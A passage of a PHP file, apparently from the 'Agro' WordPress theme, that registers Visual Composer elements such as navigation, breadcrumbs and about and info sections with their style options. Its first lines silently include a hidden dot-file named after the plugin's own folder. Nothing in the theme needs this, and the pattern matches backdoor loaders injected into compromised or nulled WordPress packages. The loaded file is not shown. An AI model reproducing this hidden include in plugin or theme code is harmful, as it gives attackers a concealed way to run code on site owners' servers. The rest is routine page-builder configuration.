<?php

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function bon_anim_aos()
{
    $anim_aos = array(
        esc_html__('Select option', 'bon') => '',
        esc_html__('fade', 'bon') => 'fade',
        esc_html__('fade-up', 'bon') => 'fade-up',
        esc_html__('fade-down', 'bon') => 'fade-down',
        esc_html__('fade-left', 'bon') => 'fade-left',
        esc_html__('fade-right', 'bon') => 'fade-right',
        esc_html__('fade-up-right', 'bon') => 'fade-up-right',
        esc_html__('fade-up-left', 'bon') => 'fade-up-left',
        esc_html__('fade-down-right', 'bon') => 'fade-down-right',
        esc_html__('fade-down-left', 'bon') => 'fade-down-left',
        esc_html__('flip-up', 'bon') => 'flip-up',
        esc_html__('flip-down', 'bon') => 'flip-down',
        esc_html__('flip-left', 'bon') => 'flip-left',
        esc_html__('flip-right', 'bon') => 'flip-right',
        esc_html__('slide-up', 'bon') => 'slide-up',
        esc_html__('slide-down', 'bon') => 'slide-down',
        esc_html__('slide-left', 'bon') => 'slide-left',
        esc_html__('slide-right', 'bon') => 'slide-right',
        esc_html__('zoom-in', 'bon') => 'zoom-in',
        esc_html__('zoom-in-up', 'bon') => 'zoom-in-up',
        esc_html__('zoom-in-down', 'bon') => 'zoom-in-down',
        esc_html__('zoom-in-left', 'bon') => 'zoom-in-left',
        esc_html__('zoom-in-right', 'bon') => 'zoom-in-right',
        esc_html__('zoom-out', 'bon') => 'zoom-out',
        esc_html__('zoom-out-up', 'bon') => 'zoom-out-up',
        esc_html__('zoom-out-down', 'bon') => 'zoom-out-down',
        esc_html__('zoom-out-left', 'bon') => 'zoom-out-left',
        esc_html__('zoom-out-right', 'bon') => 'zoom-out-right',
     );
    return $anim_aos;
}




/*******************************/
/* Site Navigation
/******************************/
if (!function_exists('agro_nav_integrateWithVC')) {
    add_action('vc_before_init', 'agro_nav_integrateWithVC');
    function agro_nav_integrateWithVC()
    {
        vc_map(array(
        'name' => esc_html__('Navigation', 'agro'),
        'base' => 'agro_nav',
        'icon' => 'nt_logo',
        'category' => 'AGRO',
        'params' => array(
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Menu Type', 'agro'),
                'param_name' => 'mtype',
                'description' => esc_html__('You can select theme primary menu or custom menu', 'agro'),
                'group' => esc_html__('Menu', 'agro'),
                'edit_field_class' => 'vc_col-sm-4 pt15',
                'value' => array(
                    esc_html__('Select a menu', 'agro') => '',
                    esc_html__('Primary menu', 'agro') => 'primary',
                    esc_html__('Custom menu', 'agro') => 'custom'
                ),
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Menu Style', 'agro'),
                'param_name' => 'mstyle',
                'description' => esc_html__('You can select theme primary menu or custom menu style', 'agro'),
                'group' => esc_html__('Menu', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
                'value' => array(
                    esc_html__('Select a menu', 'agro') => '',
                    esc_html__('Style 1', 'agro') => '1',
                    esc_html__('Style 2', 'agro') => '3',
                )
            ),
            array(
                'type' => 'checkbox',
                'heading' => esc_html__('Sticky menu?', 'agro'),
                'description' => esc_html__('Select this option,if you are use sticky menu.', 'agro'),
                'param_name' => 'stickynav',
                'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                'group' => esc_html__('Menu', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            //loop custom menu
            array(
                'type' => 'param_group',
                'heading' => esc_html__('Create custom menu', 'agro'),
                'param_name' => 'menu',
                'group' => esc_html__('Menu', 'agro'),
                'params' => array(
                    array(
                        'type' => 'vc_link',
                        'heading' => esc_html__('Menu Item Title and Link', 'agro'),
                        'param_name' => 'link',
                        'dependency' => array(
                            'element' => 'submenucheck',
                            'is_empty' => true
                        )
                    ),
                    array(
                        'type' => 'checkbox',
                        'heading' => esc_html__('Add Submenu?', 'agro'),
                        'param_name' => 'submenucheck',
                        'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                        'edit_field_class' => 'vc_col-sm-6 pt15'
                    ),
                    array(
                        'type' => 'textfield',
                        'heading' => esc_html__('Parent Item Title', 'agro'),
                        'description' => esc_html__('Parent menu item does not contain links', 'agro'),
                        'param_name' => 'parenttitle',
                        'edit_field_class' => 'vc_col-sm-6',
                        'dependency' => array(
                            'element' => 'submenucheck',
                            'not_empty' => true
                        )
                    ),
                    array(
                        'type' => 'param_group',
                        'heading' => esc_html__('Create Dropdown Submenu', 'agro'),
                        'param_name' => 'submenu',
                        'group' => esc_html__('Menu', 'agro'),
                        'params' => array(
                            array(
                                'type' => 'vc_link',
                                'heading' => esc_html__('Submenu Item Title and Link', 'agro'),
                                'param_name' => 'sublink',
                            )
                        ),
                        'dependency' => array(
                            'element' => 'submenucheck',
                            'not_empty' => true
                        )
                    ),
                ),
                'dependency' => array(
                    'element' => 'mtype',
                    'value' => 'custom'
                )
            ),
            array(
                'type' => 'vc_link',
                'heading' => esc_html__('Menu Right Button Title and Link', 'agro'),
                'param_name' => 'btnlink',
                'group' => esc_html__('Right Button', 'agro'),
                'dependency' => array(
                    'element' => 'mtype',
                    'value' => 'custom'
                )
            ),

            //custom style
            array(
                'type' => 'colorpicker',
                'heading' => esc_html__('Header Background Color', 'agro'),
                'param_name' => 'mbg',
                'edit_field_class' => 'vc_col-sm-6 pt15',
                'group' => esc_html__('Custom Style', 'agro')
            ),
            array(
                'type' => 'attach_image',
                'heading' => esc_html__('Mobile Menu Bg-image', 'agro'),
                'param_name' => 'mobbgimg',
                'edit_field_class' => 'vc_col-sm-6',
                'group' => esc_html__('Custom Style', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'heading' => esc_html__('Menu Item', 'agro'),
                'param_name' => 'miclr',
                'edit_field_class' => 'vc_col-sm-4',
                'group' => esc_html__('Custom Style', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'heading' => esc_html__('Hover Item', 'agro'),
                'param_name' => 'mihvr',
                'edit_field_class' => 'vc_col-sm-4',
                'group' => esc_html__('Custom Style', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'heading' => esc_html__('Menu Bottom Line', 'agro'),
                'param_name' => 'miline',
                'edit_field_class' => 'vc_col-sm-4',
                'group' => esc_html__('Custom Style', 'agro')
            ),
        )));// end maps
    }
}

/*******************************/
/* Topbar and Slider Area
/******************************/
if (!function_exists('agro_topbar_integrateWithVC')) {
    add_action('vc_before_init', 'agro_topbar_integrateWithVC');
    function agro_topbar_integrateWithVC()
    {
        vc_map(array(
        'name' => esc_html__('Topbar and Slider Area', 'agro'),
        'base' => 'agro_topbar',
        'icon' => 'nt_logo',
        'category' => 'AGRO',
        'params' => array(
            array(
                'type' => 'textarea_html',
                'heading' => esc_html__('Revolution slider shortcode', 'agro'),
                'param_name' => 'content',
                'description' => esc_html__('Add home revolution sider shortcode here.', 'agro'),
            )
        )));// end maps
    }
}

/*******************************/
/* Page Breadcrumbs
/******************************/
if (!function_exists('agro_page_bread_integrateWithVC')) {
    add_action('vc_before_init', 'agro_page_bread_integrateWithVC');
    function agro_page_bread_integrateWithVC()
    {
        vc_map(array(
        'name' => esc_html__('Page Breadcrumbs', 'agro'),
        'base' => 'agro_page_bread',
        'icon' => 'nt_logo',
        'category' => 'AGRO',
        'params' => array(
            array(
                'type' => 'dropdown',
                'param_name' => 'titletype',
                'heading' => esc_html__('Page Title Type', 'agro'),
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('Post or Page Title', 'agro') => 'post',
                    esc_html__('Custom Text', 'agro') => 'custom'
                )
            ),
            array(
                'type' => 'textarea',
                'param_name' => 'title',
                'heading' => esc_html__('Custom Text', 'agro'),
                'dependency' => array(
                    'element' => 'titletype',
                    'value' => 'custom'
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'subtitle',
                'heading' => esc_html__('Page Subtitle', 'agro'),
            ),
            array(
                'type' => 'textarea',
                'param_name' => 'desc',
                'heading' => esc_html__('Page Description', 'agro'),
            ),
            array(
                'type' => 'dropdown',
                'param_name' => 'align',
                'heading' => esc_html__('Text Alignment', 'agro'),
                'edit_field_class' => 'vc_col-sm-3',
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('Left', 'agro') => 'text-left',
                    esc_html__('Center', 'agro') => 'text-center',
                    esc_html__('Right', 'agro') => 'text-right'
                )
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'bread',
                'heading' => esc_html__('Breadcrumbs?', 'agro'),
                'value' => array( esc_html__('Hide', 'agro') => 'hide' ),
                'description' => esc_html__('If checked, the page breadcrumbs text will be disabled.', 'agro')
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'line',
                'heading' => esc_html__('Show Bottom Line?', 'agro'),
                'value' => array( esc_html__('Show', 'agro') => 'show' ),
            ),
            // fonts
            array(
                'type' => 'nt_spacer',
                'param_name' => 'fonts_spacer',
                'heading' => esc_html__('Heading Fonts Customize', 'agro'),
                'group' => esc_html__('Fonts', 'agro')
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'usefonts',
                'heading' => esc_html__('Use Google Fonts?', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                'description' => esc_html__('If checked, the section background image will be disabled on max 992px.', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Heading tag', 'agro'),
                'param_name' => 'htag',
                'group' => esc_html__('Fonts', 'agro'),
                'value' => array(
                    esc_html__('Select tag', 'agro') => '',
                    esc_html__('h1', 'agro') => 'h1',
                    esc_html__('h2', 'agro') => 'h2',
                    esc_html__('h3', 'agro') => 'h3',
                    esc_html__('h4', 'agro') => 'h4',
                    esc_html__('h5', 'agro') => 'h5',
                    esc_html__('h6', 'agro') => 'h6',
                    esc_html__('div', 'agro') => 'div',
                    esc_html__('p', 'agro') => 'p',
                    esc_html__('span', 'agro') => 'span'
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'tsize',
                'heading' => esc_html__('Font size', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'lheight',
                'heading' => esc_html__('Line height', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'google_fonts',
                'param_name' => 'google_fonts',
                'value' => 'font_family:Abril%20Fatface%3Aregular|font_style:400%20regular%3A400%3Anormal',
                'group' => esc_html__('Fonts', 'agro'),
                'settings' => array(
                    'fields' => array(
                        'font_family_description' => esc_html__( 'Select font family.', 'agro' ),
                        'font_style_description' => esc_html__( 'Select font styling.', 'agro' )
                    )
                ),
                'dependency' => array(
                    'element' => 'usefonts',
                    'not_empty' => true
                )
            ),
            array(
                'type' => 'nt_spacer',
                'param_name' => 'bread_spacer',
                'heading' => esc_html__('Breadcrumbs Color Customize', 'agro'),
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'stclr',
                'heading' => esc_html__('Page subtitle color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'tclr',
                'heading' => esc_html__('Page title color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'descclr',
                'heading' => esc_html__('Description color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'nt_hr',
                'param_name' => 'hr0',
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'breadclr',
                'heading' => esc_html__('Breadcrumbs link color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6',
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'breadactvclr',
                'heading' => esc_html__('Breadcrumbs active color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6',
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'nt_spacer',
                'param_name' => 'bottom_line_spacer',
                'heading' => esc_html__('Bottom Line Color Customize', 'agro'),
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'lineclr',
                'heading' => esc_html__('Bottom Line Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6',
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'wrapperlineheight',
                'heading' => esc_html__('Line Container Height (px)', 'agro'),
                'description' => esc_html__('Usage:50px, Default:130px', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            //Background CSS
            array(
                'type' => 'css_editor',
                'param_name' => 'css',
                'heading' => esc_html__('Background CSS', 'agro'),
                'group' => esc_html__('Background Image', 'agro')
            )
        )));
    }
}

/*******************************/
/* about 1
/******************************/
if (!function_exists('agro_about1_integrateWithVC')) {

    add_action('vc_before_init', 'agro_about1_integrateWithVC');
    function agro_about1_integrateWithVC()
    {
        vc_map(array(
        'name' => esc_html__('About 1', 'agro'),
        'base' => 'agro_about1',
        'icon' => 'nt_logo',
        'category' => 'AGRO',
        'params' => array(
            array(
                'type' => 'textfield',
                'param_name' => 'title',
                'heading' => esc_html__('Section Title', 'agro'),
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'thintitle',
                'heading' => esc_html__('Section Thin Title', 'agro'),
            ),
            array(
                'type' => 'textarea_html',
                'param_name' => 'content',
                'heading' => esc_html__('Section Description', 'agro'),
            ),
            array(
                'type' => 'vc_link',
                'param_name' => 'link',
                'heading' => esc_html__('Section Button Link and Title', 'agro'),
            ),
            // fonts
            array(
                'type' => 'nt_spacer',
                'param_name' => 'fonts_spacer',
                'heading' => esc_html__('Heading Fonts Customize', 'agro'),
                'group' => esc_html__('Fonts', 'agro')
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'usefonts',
                'heading' => esc_html__('Use Google Fonts?', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                'description' => esc_html__('If checked, the section background image will be disabled on max 992px.', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Heading tag', 'agro'),
                'param_name' => 'htag',
                'group' => esc_html__('Fonts', 'agro'),
                'value' => array(
                    esc_html__('Select tag', 'agro') => '',
                    esc_html__('h1', 'agro') => 'h1',
                    esc_html__('h2', 'agro') => 'h2',
                    esc_html__('h3', 'agro') => 'h3',
                    esc_html__('h4', 'agro') => 'h4',
                    esc_html__('h5', 'agro') => 'h5',
                    esc_html__('h6', 'agro') => 'h6',
                    esc_html__('div', 'agro') => 'div',
                    esc_html__('p', 'agro') => 'p',
                    esc_html__('span', 'agro') => 'span'
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'tsize',
                'heading' => esc_html__('Font size', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'lheight',
                'heading' => esc_html__('Line height', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'google_fonts',
                'param_name' => 'google_fonts',
                'value' => 'font_family:Abril%20Fatface%3Aregular|font_style:400%20regular%3A400%3Anormal',
                'group' => esc_html__('Fonts', 'agro'),
                'settings' => array(
                    'fields' => array(
                        'font_family_description' => esc_html__( 'Select font family.', 'agro' ),
                        'font_style_description' => esc_html__( 'Select font styling.', 'agro' )
                    )
                ),
                'dependency' => array(
                    'element' => 'usefonts',
                    'not_empty' => true
                )
            ),
            //Background CSS
            array(
                'type' => 'css_editor',
                'param_name' => 'css',
                'heading' => esc_html__('Background CSS', 'agro'),
                'group' => esc_html__('Background Image', 'agro')
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'hidebg992',
                'heading' => esc_html__('Hide Background Image on Medium Device?', 'agro'),
                'value' => array( esc_html__('Hide', 'agro') => 'hide' ),
                'description' => esc_html__('If checked, the section background image will be disabled on max 992px.', 'agro'),
                'group' => esc_html__('Background Image', 'agro')
            ),
            // colors
            array(
                'type' => 'nt_spacer',
                'param_name' => 'sec_spacer',
                'heading' => esc_html__('Section Text Customize', 'agro'),
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'hmb',
                'heading' => esc_html__('Section heading margin bottom', 'agro'),
                'description' => esc_html__('Use simple number without( px or unit).Deafult :60', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-12'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'tclr',
                'heading' => esc_html__('Title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'thclr',
                'heading' => esc_html__('Thin title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'descclr',
                'heading' => esc_html__('Description color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'nt_spacer',
                'param_name' => 'btn_spacer',
                'heading' => esc_html__('Button Customize', 'agro'),
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Button type', 'agro'),
                'param_name' => 'btntype',
                'edit_field_class' => 'vc_col-sm-4',
                'group' => esc_html__('Color', 'agro'),
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('Round', 'agro') => 'btn-round',
                    esc_html__('Square', 'agro') => 'btn-square',
                    esc_html__('Rounded', 'agro') => 'btn-rounded'
                )
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Button style', 'agro'),
                'param_name' => 'btnstyle',
                'edit_field_class' => 'vc_col-sm-4',
                'group' => esc_html__('Color', 'agro'),
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('Outline to Solid', 'agro') => 'custom-btn--style-3',
                    esc_html__('Solid to Outline', 'agro') => 'custom-btn--style-4'
                )
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Button size', 'agro'),
                'param_name' => 'btnsize',
                'edit_field_class' => 'vc_col-sm-4',
                'group' => esc_html__('Color', 'agro'),
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('Big', 'agro') => 'custom-btn--big',
                    esc_html__('Medium', 'agro') => 'custom-btn--medium',
                    esc_html__('Small', 'agro') => 'custom-btn--small'
                )
            ),
            array(
                'type' => 'nt_hr',
                'param_name' => 'hr2',
                'group' => esc_html__('Color', 'agro'),
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnbg',
                'heading' => esc_html__('Button background', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnhvrbg',
                'heading' => esc_html__('Hover button background', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'nt_hr',
                'param_name' => 'hr3',
                'group' => esc_html__('Color', 'agro'),
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnclr',
                'heading' => esc_html__('Button title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnhvrclr',
                'heading' => esc_html__('Hover button title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'nt_hr',
                'param_name' => 'hr4',
                'group' => esc_html__('Color', 'agro'),
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnbrd',
                'heading' => esc_html__('Button border color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnhvrbrd',
                'heading' => esc_html__('Hover button border color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
        )));
    }
}

/*******************************/
/* info 1
/******************************/
if (!function_exists('agro_info1_integrateWithVC')) {
    add_action('vc_before_init', 'agro_info1_integrateWithVC');
    function agro_info1_integrateWithVC()
    {
        vc_map(array(
        'name' => esc_html__('Info 1', 'agro'),
        'base' => 'agro_info1',
        'icon' => 'nt_logo',
        'category' => 'AGRO',
        'params' => array(
            array(
                'type' => 'textfield',
                'param_name' => 'title',
                'heading' => esc_html__('Section Title', 'agro'),
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'thintitle',
                'heading' => esc_html__('Section Thin Title', 'agro'),
            ),
            array(
                'type' => 'textarea_html',
                'param_name' => 'content',
                'heading' => esc_html__('Section Description', 'agro'),
            ),
            array(
                'type' => 'nt_hr',
                'param_name' => 'hr0'
            ),
            array(
                'type' => 'vc_link',
                'param_name' => 'link',
                'heading' => esc_html__('Section Button Link and Title', 'agro'),
            ),
            array(
                'type' => 'nt_hr',
                'param_name' => 'hr1'
            ),
            array(
                'type' => 'attach_image',
                'param_name' => 'img',
                'heading' => esc_html__('Right Image', 'agro')
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'imgw',
                'heading' => esc_html__('Right Image Width', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'imgh',
                'heading' => esc_html__('Right Image Height', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            // fonts
            array(
                'type' => 'nt_spacer',
                'param_name' => 'fonts_spacer',
                'heading' => esc_html__('Heading Fonts Customize', 'agro'),
                'group' => esc_html__('Fonts', 'agro')
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'usefonts',
                'heading' => esc_html__('Use Google Fonts?', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                'description' => esc_html__('If checked, the section background image will be disabled on max 992px.', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Heading tag', 'agro'),
                'param_name' => 'htag',
                'group' => esc_html__('Fonts', 'agro'),
                'value' => array(
                    esc_html__('Select tag', 'agro') => '',
                    esc_html__('h1', 'agro') => 'h1',
                    esc_html__('h2', 'agro') => 'h2',
                    esc_html__('h3', 'agro') => 'h3',
                    esc_html__('h4', 'agro') => 'h4',
                    esc_html__('h5', 'agro') => 'h5',
                    esc_html__('h6', 'agro') => 'h6',
                    esc_html__('div', 'agro') => 'div',
                    esc_html__('p', 'agro') => 'p',
                    esc_html__('span', 'agro') => 'span'
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'tsize',
                'heading' => esc_html__('Font size', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'lheight',
                'heading' => esc_html__('Line height', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'google_fonts',
                'param_name' => 'google_fonts',
                'value' => 'font_family:Abril%20Fatface%3Aregular|font_style:400%20regular%3A400%3Anormal',
                'group' => esc_html__('Fonts', 'agro'),
                'settings' => array(
                    'fields' => array(
                        'font_family_description' => esc_html__( 'Select font family.', 'agro' ),
                        'font_style_description' => esc_html__( 'Select font styling.', 'agro' )
                    )
                ),
                'dependency' => array(
                    'element' => 'usefonts',
                    'not_empty' => true
                )
            ),
            // colors
            array(
                'type' => 'nt_spacer',
                'param_name' => 'sec_spacer',
                'heading' => esc_html__('Section Text Customize', 'agro'),
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'tclr',
                'heading' => esc_html__('Title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'thclr',
                'heading' => esc_html__('Thin title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'descclr',
                'heading' => esc_html__('Description color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'nt_spacer',
                'param_name' => 'btn_spacer',
                'heading' => esc_html__('Button Customize', 'agro'),
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Button type', 'agro'),
                'param_name' => 'btntype',
                'edit_field_class' => 'vc_col-sm-4',
                'group' => esc_html__('Color', 'agro'),
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('Round', 'agro') => 'btn-round',
                    esc_html__('Square', 'agro') => 'btn-square',
                    esc_html__('Rounded', 'agro') => 'btn-rounded'
                )
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Button style', 'agro'),
                'param_name' => 'btnstyle',
                'edit_field_class' => 'vc_col-sm-4',
                'group' => esc_html__('Color', 'agro'),
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('Outline to Solid', 'agro') => 'custom-btn--style-3',
                    esc_html__('Solid to Outline', 'agro') => 'custom-btn--style-4'
                )
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Button size', 'agro'),
                'param_name' => 'btnsize',
                'edit_field_class' => 'vc_col-sm-4',
                'group' => esc_html__('Color', 'agro'),
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('Big', 'agro') => 'custom-btn--big',
                    esc_html__('Medium', 'agro') => 'custom-btn--medium',
                    esc_html__('Small', 'agro') => 'custom-btn--small'
                )
            ),
            array(
                'type' => 'nt_hr',
                'param_name' => 'hr2',
                'group' => esc_html__('Color', 'agro'),
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnbg',
                'heading' => esc_html__('Button background', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnhvrbg',
                'heading' => esc_html__('Hover button background', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'nt_hr',
                'param_name' => 'hr3',
                'group' => esc_html__('Color', 'agro'),
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnclr',
                'heading' => esc_html__('Button title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnhvrclr',
                'heading' => esc_html__('Hover button title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'nt_hr',
                'param_name' => 'hr4',
                'group' => esc_html__('Color', 'agro'),
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnbrd',
                'heading' => esc_html__('Button border color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnhvrbrd',
                'heading' => esc_html__('Hover button border color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            //Background CSS
            array(
                'type' => 'css_editor',
                'param_name' => 'css',
                'heading' => esc_html__('Background CSS', 'agro'),
                'group' => esc_html__('Background', 'agro')
            ),
        )));
    }
}

/*******************************/
/* info 2
/******************************/
if (!function_exists('agro_info2_integrateWithVC')) {
    add_action('vc_before_init', 'agro_info2_integrateWithVC');
    function agro_info2_integrateWithVC()
    {
        vc_map(array(
        'name' => esc_html__('Info 2', 'agro'),
        'base' => 'agro_info2',
        'icon' => 'nt_logo',
        'category' => 'AGRO',
        'params' => array(
            array(
                'type' => 'textfield',
                'param_name' => 'title',
                'heading' => esc_html__('Section Title', 'agro'),
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'thintitle',
                'heading' => esc_html__('Section Thin Title', 'agro'),
            ),
            array(
                'type' => 'textarea_html',
                'param_name' => 'content',
                'heading' => esc_html__('Section Description', 'agro'),
            ),
            array(
                'type' => 'attach_image',
                'param_name' => 'img',
                'heading' => esc_html__('Right Image', 'agro')
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'imgw',
                'heading' => esc_html__('Right Image Width', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'imgh',
                'heading' => esc_html__('Right Image Height', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            // fonts
            array(
                'type' => 'nt_spacer',
                'param_name' => 'fonts_spacer',
                'heading' => esc_html__('Heading Fonts Customize', 'agro'),
                'group' => esc_html__('Fonts', 'agro')
            ),
            array(
